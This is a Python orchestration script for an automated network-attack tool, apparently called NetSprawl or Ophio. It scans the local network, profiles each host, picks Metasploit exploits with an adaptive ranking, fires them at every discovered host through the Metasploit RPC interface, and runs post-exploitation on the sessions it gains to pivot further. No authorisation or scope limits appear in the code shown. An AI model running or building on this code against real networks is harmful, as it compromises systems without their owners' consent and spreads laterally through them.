import Identifier
import Enricher
import Selector
import Exploiter
from record import Record

from pymongo import MongoClient, ReturnDocument
from metasploit.msfrpc import MsfRpcClient

import json
import time
import copy
import logging
# import traceback # for debug

def main():
    ### setup
    # initialize structures for orchestration
    # connect to database
    # connect to msf rpc
    # initialize exploits + data for selector
    # initialize logging

    dbClient = MongoClient()
    dbRef = dbClient["NetSprawl"]
    netMapTable = dbRef["Map"]
    exploitTable = dbRef["Exploits"] # TODO export weights from Selector

    msfClient = MsfRpcClient("pass")

    hostCollection = []
    rootHost = None

    enrichQueue = []
    exploitQueue = []
    postexQueue = []

    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())

    logger = logging.getLogger("Ophio")
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("ophio.log")
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    logger.addHandler(fh)
    logger.addHandler(ch)

    logger.info("Starting a new scan. Time: {}".format(time.time()))



    # main loop
    while True:
        ### identifier
        # call scanCurrentNetwork on initial host
        # log results of scan
        # identify root node
        # add host records to database

        if len(enrichQueue) == 0: # can skip if prev cycle has identified new hosts
            logger.info("Identifying...")
            identifyResults = json.loads(Identifier.scanCurrentNetwork())
            rootInterfaces = []
            hostsDiscovered = []
            for network in identifyResults:
                rootInterfaces.append(network["network"])
                for hostIp in network["hosts"]:
                    hostsDiscovered.append(hostIp)

        if rootHost == None:
            rootIps = [interface.split("/")[0] for interface in rootInterfaces] # remove CIDR notation
            logger.info("Root host set to IP(s) {}".format(rootIps))
            rootHost = Record(rootIps, None)
            rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
            rootHost.exploitStatus["exploitUsed"] = "N/A"
            record = rootHost.toDict()
            netMapTable.insert(record)
            rootHost.id = record["_id"]
            hostCollection.append(rootHost)
            enrichQueue.append(rootHost)

        for hostIp in hostsDiscovered:
            uniqueIp = True
            for record in hostCollection:
                if hostIp in record.interfaces:
                    uniqueIp = False

            if uniqueIp:
                logger.info("New host discovered at IP {}".format(hostIp))
                hostRecord = Record([hostIp], rootHost.id)
                record = hostRecord.toDict()
                netMapTable.insert(record)
                hostRecord.id = record["_id"]
                hostCollection.append(hostRecord)
                enrichQueue.append(hostRecord)



        ### enricher
        # call scanHostsForInfo on list of hosts, excluding self
        # log results of scans
        # append information to host records in database

        if len(enrichQueue) > 0:
            logger.info("Enriching...")
        while len(enrichQueue) > 0:
            hostRecord = enrichQueue.pop()
            logger.info("Scanning host at IP {}".format(hostRecord.interfaces))
            enrichResults = json.loads(Enricher.scanHostsForInfo(hostRecord.interfaces)[0])
            # TODO concatenate results if there are multiple interfaces on a host
            hostRecord.os = enrichResults[0]
            hostRecord.openPorts = enrichResults[1:] if len(enrichResults) > 1 else []
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        'os': hostRecord.os,
                        'openPorts': hostRecord.openPorts
                    }
                 }
            )
            exploitQueue.append(hostRecord)



        ### selector/exploiter
        # call search on enriched host data
        # attempt exploits in recommended order
        # log results and update selector after each exploit run
        # append exploit status (exploit used, MS session) to host records

        if len(exploitQueue) > 0:
            logger.info("Exploiting...")
        while len(exploitQueue) > 0:
            hostRecord = exploitQueue.pop()
            logger.info("Profiling host at IP {}".format(hostRecord.interfaces))
            localIp = rootHost.interfaces[0]
            targetIp = hostRecord.interfaces[0]
            hostData = copy.copy(hostRecord.openPorts)
            hostData.insert(0, hostRecord.os)
            exploitOrder = strategy.search(hostData)
            logger.debug("Recommended ordering: {}".format(exploitOrder))

            for exploit in exploitOrder:
                logger.info("Attempting exploit {} against host".format(exploit))
                try:
                    exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
                    exploitSuccess = exploitResults["job_id"] != None
                except Exception:
                    logger.info("Exploit {} failed abnormally.".format(exploit))
                    # traceback.print_exc()
                    exploitSuccess = False
                strategy.update(hostData, exploit, exploitSuccess)
                if exploitSuccess:
                    break

            if not exploitSuccess:
                logger.info("Failed to exploit host at IP {}".format(targetIp))
                hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
            else:
                logger.info("Successfully exploited host at IP {}".format(targetIp))
                hostRecord.exploitStatus = {
                    "statusCode": Record.STATUS_SUCCESS,
                    "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
                    "msSessionId": exploitResults["job_id"]
                }
            # TODO make sure this update works
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        "exploitStatus": hostRecord.exploitStatus
                    }
                }
            )
            postexQueue.append(hostRecord)



        ### post-exploits
        # drop and run identifier on exploited boxes
        # add new hosts to records + database
        # enrich and exploit new hosts as usual

        logger.info("Postexploiting...")
        logger.info("Sessions available:")
        while len(postexQueue) > 0:
            hostRecord = postexQueue.pop()
            sessionDbg = {"IP": hostRecord.interfaces, "UUID": hostRecord.exploitStatus["exploitUsed"], "Session ID":hostRecord.exploitStatus["msSessionId"]}
            logger.info(sessionDbg)

            err, interfaces = Exploiter.callPostExploit(msfClient, "remote_host_netinfo", hostRecord.exploitStatus["msSessionId"])
            if err == 0:
                logger.info("Interfaces: {}".format(interfaces))
            else:
                logger.info("Unable to execute remote_host_netinfo against host")
                
            # TODO modify networking as needed
            # TODO scan for new hosts
            # add results to enricher queue



        ### repetition
        # identifiers should be rerun periodically to identify new hosts
        # alternative: run once, and restore state from DB info on startup
        logger.info("Reached end of cycle.")
        # TODO save exploiter weights to database
        # TODO organize data for reports/next cycle
        if len(enrichQueue) == 0:
            logger.info("Nothing new to scan. Sleeping.")
            time.sleep(60)



        ### logging and reporting
        # writing activities to a log file from lifecycle is a decent start
        # function (seperate script?) to produce report on network map & status from memory state or db records

if __name__ == '__main__':
    main()
